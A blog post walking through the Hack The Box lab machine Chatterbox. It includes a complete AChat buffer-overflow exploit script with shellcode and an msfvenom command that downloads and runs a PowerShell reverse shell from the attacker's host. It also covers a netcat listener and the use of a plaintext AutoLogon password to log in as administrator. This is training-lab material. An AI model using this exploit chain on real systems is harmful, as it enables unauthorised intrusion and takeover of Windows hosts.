---
layout: post
title: "HTB: Chatterbox Walkthrough"
---

<img src="{{ '/assets/images/chatterbox-icon.png' | relative_url }}" alt="Chatterbox Icon" />

# intro

The goal of this post to provide an updated version of Hack The Boxes machine, [Chatterbox](https://app.hackthebox.com/machines/123) (I am not sure if any one else has made a similar post but more than one doesn't hurt). 

There where a few trouble areas when doing this machine so my goal is to help anyone who may have ran into similar issues themsleves. I followed [0xdf's](https://0xdf.gitlab.io/2018/06/18/htb-chatterbox.html) walkthrough and there seems to be seem dated steps that could be updated. I intend to correct these dated issues with this post.

Let's dive in! 

## reconnaissance

As usual with any CTF-type machine, we are going to start out with an **nmap** scan:

```bash
t3lesph0re@neptune:~$ nmap -p- 10.10.10.74

Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-14 18:39 EDT
Nmap scan report for 10.10.10.74
Host is up (0.030s latency).
Not shown: 65524 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
9255/tcp  open  mon
9256/tcp  open  unknown
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 60.09 seconds
```

The **nmap** scan shows that there are two _non-default_ ports outside of the default top 1000 ports that are usually open, port `9255` and `9256`. 

### AChat on port 9256

There is a service called **AChat** running on port `9255` and `9256`. There is a known [buffer overflow](https://www.exploit-db.com/exploits/36025) that affects the version on AChat running on our attack machine. The exploits is sent to port `9256 / UDP`. 

## initial exploit 

Because this is a windows host, we can use [Nishang's](https://github.com/samratashok/nishang) **Invoke-PowerShellTcp.ps1** script to get a shell. 

We will create a payload with **msfvenom** and deliver it via the Exploit-DB Python script to exploit the AChat vulnerability. Successful exploitation will run **Invoke-PowerShellTcp.ps1** and attempt to establish a reverse shell.

This is the **msfvenom** command to generate the shell code that we will use in the Python script:

```bash
t3lesph0re@neptune:~$ msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell iex(new-object net.webclient).downloadstring('http://10.10.14.8/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.8 -Port 8082" -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python > shellcode
```

This will save a **Python-formatted representation** of the generated payload to the file **shellcode**. When you output this file you will have your encoded shell that you will need to put into the Exploit-DB script (see below):

```python
#!/usr/bin/python
# Author KAhara MAnhara
# Achat 0.150 beta7 - Buffer Overflow
# Tested on Windows 7 32bit

import socket
import sys, time

# REPLACE THIS w/ Shellcode 
buf =  ""
buf += "\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
buf += "\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += "\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41"
buf += "\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51"
buf += "\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31"
buf += "\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41"
buf += "\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41"
buf += "\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41"
buf += "\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41"
buf += "\x47\x42\x39\x75\x34\x4a\x42\x69\x6c\x77\x78\x62\x62"
buf += "\x69\x70\x59\x70\x4b\x50\x73\x30\x43\x59\x5a\x45\x50"
buf += "\x31\x67\x50\x4f\x74\x34\x4b\x50\x50\x4e\x50\x34\x4b"
buf += "\x30\x52\x7a\x6c\x74\x4b\x70\x52\x4e\x34\x64\x4b\x63"
buf += "\x42\x4f\x38\x4a\x6f\x38\x37\x6d\x7a\x4d\x56\x4d\x61"
buf += "\x49\x6f\x74\x6c\x4f\x4c\x6f\x71\x33\x4c\x69\x72\x4e"
buf += "\x4c\x4f\x30\x66\x61\x58\x4f\x5a\x6d\x59\x71\x67\x57"
buf += "\x68\x62\x48\x72\x52\x32\x50\x57\x54\x4b\x72\x32\x4e"
buf += "\x30\x64\x4b\x6e\x6a\x4d\x6c\x72\x6b\x70\x4c\x4a\x71"
buf += "\x43\x48\x39\x53\x71\x38\x6a\x61\x36\x71\x4f\x61\x62"
buf += "\x6b\x42\x39\x4f\x30\x4a\x61\x38\x53\x62\x6b\x30\x49"
buf += "\x6b\x68\x58\x63\x4e\x5a\x6e\x69\x44\x4b\x6f\x44\x72"
buf += "\x6b\x4b\x51\x36\x76\x70\x31\x69\x6f\x46\x4c\x57\x51"
buf += "\x48\x4f\x4c\x4d\x6a\x61\x55\x77\x4f\x48\x57\x70\x54"
buf += "\x35\x49\x66\x49\x73\x51\x6d\x7a\x58\x6d\x6b\x53\x4d"
buf += "\x4e\x44\x34\x35\x38\x64\x62\x38\x62\x6b\x52\x38\x6b"
buf += "\x74\x69\x71\x4a\x33\x33\x36\x54\x4b\x7a\x6c\x6e\x6b"
buf += "\x72\x6b\x51\x48\x6d\x4c\x6b\x51\x67\x63\x52\x6b\x49"
buf += "\x74\x72\x6b\x4d\x31\x7a\x30\x44\x49\x51\x34\x6e\x44"
buf += "\x4b\x74\x61\x4b\x51\x4b\x4f\x71\x51\x49\x71\x4a\x52"
buf += "\x31\x49\x6f\x69\x50\x31\x4f\x51\x4f\x6e\x7a\x34\x4b"
buf += "\x6a\x72\x38\x6b\x44\x4d\x71\x4d\x50\x6a\x59\x71\x64"
buf += "\x4d\x35\x35\x65\x62\x4b\x50\x49\x70\x4b\x50\x52\x30"
buf += "\x32\x48\x6c\x71\x64\x4b\x72\x4f\x51\x77\x59\x6f\x79"
buf += "\x45\x45\x6b\x48\x70\x75\x65\x35\x52\x30\x56\x72\x48"
buf += "\x33\x76\x35\x45\x37\x4d\x63\x6d\x49\x6f\x37\x65\x6d"
buf += "\x6c\x6a\x66\x31\x6c\x79\x7a\x51\x70\x4b\x4b\x67\x70"
buf += "\x53\x45\x6d\x35\x55\x6b\x31\x37\x4e\x33\x32\x52\x30"
buf += "\x6f\x42\x4a\x6d\x30\x50\x53\x79\x6f\x37\x65\x70\x63"
buf += "\x53\x31\x72\x4c\x30\x63\x4c\x6e\x70\x65\x32\x58\x50"
buf += "\x65\x6d\x30\x41\x41"
# REPLACE THIS w/ Shellcode ^

# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_address = ('10.10.10.74', 9256) # UPDATED IP POINTING TO TARGET

fs = "\x55\x2A\x55\x6E\x58\x6E\x05\x14\x11\x6E\x2D\x13\x11\x6E\x50\x6E\x58\x43\x59\x39"
p  = "A0000000002#Main" + "\x00" + "Z"*114688 + "\x00" + "A"*10 + "\x00"
p += "A0000000002#Main" + "\x00" + "A"*57288 + "AAAAASI"*50 + "A"*(3750-46)
p += "\x62" + "A"*45
p += "\x61\x40" 
p += "\x2A\x46"
p += "\x43\x55\x6E\x58\x6E\x2A\x2A\x05\x14\x11\x43\x2d\x13\x11\x43\x50\x43\x5D" + "C"*9 + "\x60\x43"
p += "\x61\x43" + "\x2A\x46"
p += "\x2A" + fs + "C" * (157-len(fs)- 31-3)
p += buf + "A" * (1152 - len(buf))
p += "\x00" + "A"*10 + "\x00"

print "---->{P00F}!"
i=0
while i<len(p):
    if i > 172000:
        time.sleep(1.0)
    sent = sock.sendto(p[i:(i+8192)], server_address)
    i += sent
sock.close()
```

Once you have updated this script, we will need 3 seperate terminals: python HTTP server, listener, and the exploit script. 

1. Start the HTTP python server:

```bash
t3lesph0re@neptune:~$ python3 -m http.server 80
```

2. Start the listener:

```bash
t3lesph0re@neptune:~$ nc -lnvp 8082
```

3. Run the Python script:

Because the script shebang shows **#!/usr/bin/python**, we will use **Python2**:

```bash
t3lesph0re@neptune:~$ python2 36025
```

The Python script will run and you will see that the **Invoke-PowerShellTcp.ps1** was grab from the Python HTTP server `10.10.10.74 - - [14/Oct/2025 19:09:22] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -`. Additionally, the script will output its `---->{P00F}!` and you will get your reverse shell for the user **chatterbox\alfred**. 

<figure>
  <img src="{{ '/assets/images/chatterbox-revshell.png' | relative_url }}" alt="Chatterbox Reverse Shell" />
  <figcaption>Reverse Shell as user Alfred</figcaption>
</figure>

## privilege escaation to admin

From here we can use our low level user shell to enumerate the AutoLogon credentials:

```powershell
PS C:\> reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ    
    LegalNoticeText    REG_SZ    
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    ShutdownWithoutLogon    REG_SZ    0
    WinStationsDisabled    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    scremoveoption    REG_SZ    0
    ShutdownFlags    REG_DWORD    0x11
    DefaultDomainName    REG_SZ    
    DefaultUserName    REG_SZ    Alfred
    AutoAdminLogon    REG_SZ    1
    DefaultPassword    REG_SZ    Welcome1!
```

Here we can see that the _DefaultPassword_ **Welcome1!** is in plaintext. 

Using **winexe** we can login using this password for the user **administrator** to grab the final flag of the challenge! 

```bash
t3lesph0re@neptune:~$ winexe -U 'administrator%Welcome1!' //10.10.10.74 cmd.exe
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
chatterbox\administrator
```
Screenshot showing admin access: 

<figure>
  <img src="{{ '/assets/images/chatterbox-admin.png' | relative_url }}" alt="Chatterbox Admin" />
  <figcaption>Access as Admin</figcaption>
</figure>

I hope this was helpful!
 
# end 